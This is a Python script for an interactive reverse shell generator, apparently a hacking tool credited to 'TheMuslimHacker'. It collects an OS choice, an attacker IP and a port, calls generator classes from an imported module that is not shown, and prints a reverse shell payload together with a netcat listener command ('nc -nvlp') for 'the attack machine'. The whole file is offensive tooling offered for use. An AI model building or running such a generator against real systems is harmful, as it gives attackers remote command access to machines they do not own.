# MIT License
#
# Copyright (c) 2024 TheMuslimHacker
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import reverse_shells
import ipaddress
from colorama import Fore, Style

# Function to print the title of the reverse shell program in a colored format
def print_shell_title():
    title = '''
                                                 ____    __    ____  __    __       ___       ______  __  ___        
                                                \   \  /  \  /   / |  |  |  |     /   \     /      ||  |/  /        
                                                 \   \/    \/   /  |  |__|  |    /  ^  \   |  ,----'|  '  /         
                                                  \            /   |   __   |   /  /_\  \  |  |     |    <          
                                                   \    /\    /    |  |  |  |  /  _____  \ |  `----.|  .  \         
                                                    \__/  \__/     |__|  |__| /__/     \__\ \______||__|\__\        
                    
                                                                    by TheMuslimHacker(TMH) 

                                                     ___              _______. __    __   _______  __       __      
                                                    /   \            /       ||  |  |  | |   ____||  |     |  |     
                                                   /  ^  \          |   (----`|  |__|  | |  |__   |  |     |  |     
                                                  /  /_\  \          \   \    |   __   | |   __|  |  |     |  |     
                                                 /  _____  \     .----)   |   |  |  |  | |  |____ |  `----.|  `----.
                                                /__/     \__\    |_______/    |__|  |__| |_______||_______||_______|                  
                         
'''
    print(Fore.MAGENTA + Style.BRIGHT + title + Style.RESET_ALL)

# Function to prompt the user to select an operating system for the reverse shell
def os_choice():
    oses = {1: 'Windows', 2: "Linux"}  # Dictionary mapping choices to OS names
    print("Please select the OS for the reverse shell:")

    # Try to convert user input into an integer (for OS selection)
    try:
        choice = int(input("Enter 1 for Windows\nEnter 2 for Linux\nChoice: "))
    except ValueError:
        choice = 0  # If input is not an integer, set choice to 0 to ensure re-prompt

    # While loop to ensure valid input (1 for Windows, 2 for Linux)
    while choice not in [1, 2]:
        print(Fore.RED + Style.BRIGHT + "\nPlease type in either 1 or 2\n" + Style.RESET_ALL)
        try:
            choice = int(input("Enter 1 for Windows\nEnter 2 for Linux\nChoice: "))
        except ValueError:
            choice = 0  # Continue loop if input is invalid (e.g., not a number)

    return oses[choice]  # Return the corresponding OS (Windows or Linux)

# Function to get a valid IP address from the user
def get_valid_ip():
    while True:
        ip = input("Enter the IP address: ")  # Prompt the user for the IP address
        try:
            ipaddress.IPv4Address(ip)  # Validate if the input is a valid IPv4 address
            return ip  # Return the valid IP address
        except ipaddress.AddressValueError:
            print(Fore.RED + Style.BRIGHT + "\nInvalid IP address format. Please enter a valid IPv4 address.\n" + Style.RESET_ALL)

# Function to get a valid port number from the user
def get_valid_port():
    while True:
        try:
            port = int(input("Enter the port number: "))  # Prompt the user for the port number
            # Validate that the port is between 1 and 65535 (valid range for ports)
            if 1 <= port <= 65535:
                return port  # If the port is valid, return it
            else:
                print(Fore.RED + Style.BRIGHT + "\nInvalid port format. The port should be between 1 and 65535. Please try again\n" + Style.RESET_ALL)
        except ValueError:
            print(Fore.RED + Style.BRIGHT + "\nInvalid input. Please enter a valid number for the port, no other characters!\n" + Style.RESET_ALL)


# Function to choose the reverse shell based on the selected OS and generate the reverse shell command
def reverse_shell_choice(os):
    IP = get_valid_ip()  # Get the valid IP from the user
    PORT = get_valid_port()  # Get the valid port from the user
    shell = True  # Initialize a variable to hold the shell object

    if os == "Linux":
        # Instantiate the Linux reverse shell generator
        shell = reverse_shells.LinuxReverseShellGenerator(IP, PORT)
    else:
        # Instantiate the Windows reverse shell generator
        shell = reverse_shells.WindowsReverseShellGenerator(IP, PORT)

    # Create a dictionary of methods from the shell object, filtering out private methods (those starting with "_")
    shell_methods = {i + 1: method for i, method in enumerate(
        [func for func in dir(shell) if callable(getattr(shell, func)) and not func.startswith("_")]
    )}

    print("\nPlease choose the shell program\n")

    # Display the available shell methods dynamically
    for key, method_name in shell_methods.items():
        print(f"Enter {key} for {method_name.replace('_', ' ').title()}")  # Print method options

    try:
        choice = int(input("Choice: "))  # Get the user's choice of method
    except ValueError:
        choice = 0  # Invalid choice, set to 0 to trigger re-prompt

    # Ensure the selected method choice is valid
    while choice not in shell_methods:
        print(Fore.RED + Style.BRIGHT + "\nPlease type a valid option\n" + Style.RESET_ALL)
        try:
            choice = int(input("Choice: "))  # Re-prompt for a valid choice
        except ValueError:
            choice = 0  # Set to 0 to continue the loop if input is invalid

    # Dynamically call the selected shell method
    selected_method = shell_methods[choice]
    return getattr(shell, selected_method)(), PORT  # Call and return the method and the port

# Main entry point of the program
if __name__ == '__main__':

    print_shell_title()
    os = os_choice()  # Get the OS choice from the user
    os_mod = Fore.MAGENTA + Style.BRIGHT + os + Style.RESET_ALL  # Format the OS choice for display
    print(f"\nYou have selected {os_mod} for the reverse shell.\n")  # Print the selected OS

    shell, port = reverse_shell_choice(os)  # Get the reverse shell command and port

    # Format the shell command and listener command for display
    shell_mod = Fore.MAGENTA + Style.BRIGHT + shell + Style.RESET_ALL
    port_mod = Fore.MAGENTA + Style.BRIGHT + f"nc -nvlp {port}" + Style.RESET_ALL

    # Display the reverse shell and the listener command
    print(f"\nHere is your reverse shell: {shell_mod}\n")
    print(f"Run this command on the attack machine to set up a listener: {port_mod}\n")
